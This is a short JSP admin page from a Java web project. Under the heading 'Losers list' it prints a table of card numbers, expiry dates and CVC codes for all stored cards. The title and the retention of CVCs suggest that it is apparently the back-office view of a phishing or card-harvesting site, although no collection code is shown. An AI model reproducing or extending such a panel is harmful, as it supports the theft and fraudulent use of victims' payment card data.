<%--
  Created by IntelliJ IDEA.
  User: Ivan
  Date: 20.04.2018
  Time: 20:34
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<html>
<head>
    <title>Admin</title>
</head>
<body>
<div>
    <H2 align="center">Losers list</H2>
    <table align="center" cellpadding="5px">
    <tr><td>Card Number</td>  <td>Expire date</td>  <td>Cvc</td></tr>
    <c:forEach var="card" items="${allCards}">

        <tr>
            <td>${card.cardNumber}</td>  <td>${card.date}</td>  <td>${card.cvc}</td>
        </tr>

    </c:forEach>

    </table>
</div>
</body>
</html>
